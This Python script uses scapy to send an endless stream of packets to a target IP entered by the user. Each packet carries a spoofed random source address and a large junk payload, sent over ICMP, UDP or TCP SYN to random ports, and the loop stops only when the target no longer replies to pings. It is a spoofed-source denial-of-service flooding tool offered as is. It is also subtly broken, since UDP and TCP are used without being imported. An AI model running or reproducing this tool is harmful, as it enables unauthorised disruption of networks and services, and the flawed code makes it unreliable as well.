from scapy.all import IP, ICMP, send, sr1
import random
import time

def generate_payload(size):
    """Generate a random payload of specified size."""
    return b"X" * size

def send_packet(target_ip, protocol="ICMP"):
    """Send a single packet to the target."""
    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))  # Random valid IP
    payload = generate_payload(random.randint(512, 2048))

    try:
        if protocol == "ICMP":
            packet = IP(src=src_ip, dst=target_ip)/ICMP()/payload
        elif protocol == "UDP":
            packet = IP(src=src_ip, dst=target_ip)/UDP(dport=random.randint(1, 65535))/payload
        elif protocol == "TCP":
            packet = IP(src=src_ip, dst=target_ip)/TCP(dport=random.randint(1, 65535), flags="S")/payload
        else:
            print("Unknown protocol")
            return

        send(packet, verbose=0)
        print(f"Packet sent to {target_ip} via {protocol}")
    except Exception as e:
        print(f"Error sending packet: {e}")

def is_target_reachable(target_ip, timeout=2):
    """Check if the target IP is reachable using ICMP ping."""
    try:
        reply = sr1(IP(dst=target_ip)/ICMP(), timeout=timeout, verbose=0)
        return reply is not None
    except Exception as e:
        print(f"Error during reachability check: {e}")
        return False

if __name__ == "__main__":
    target_ip = input("Enter the target IP address: ")
    protocol = input("Enter the protocol (ICMP/UDP/TCP): ")

    print(f"Starting to send packets to {target_ip} indefinitely. Checking reachability...")

    while True:
        # Send a packet
        send_packet(target_ip, protocol)

        # Check if the target IP is reachable
        if not is_target_reachable(target_ip):
            print(f"Target {target_ip} is no longer reachable. Stopping...")
            break

        time.sleep(0.1)  # Small delay to avoid overwhelming the system
